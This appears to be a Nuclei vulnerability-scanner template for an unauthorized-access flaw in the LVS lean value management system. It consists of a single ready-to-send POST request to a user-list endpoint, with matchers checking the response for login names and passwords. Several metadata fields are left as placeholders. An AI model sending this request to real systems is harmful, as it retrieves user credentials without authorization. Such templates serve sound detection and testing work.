id: lvs-UserList-info
info:
  name: Template Name
  author: wangzong
  severity: high
  description: LVS精益价值管理系统存在未授权访问，可以获取账号密码。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /Business/BaseData/Org/UserList.aspx?Type=BindGrid HTTP/1.1
        Host: {{Hostname}}
        accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Length: 29

        strParams=&page=1&pagesize=20
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'LoginName'
      - type: word
        part: body
        words:
          - 'LoginPwd'
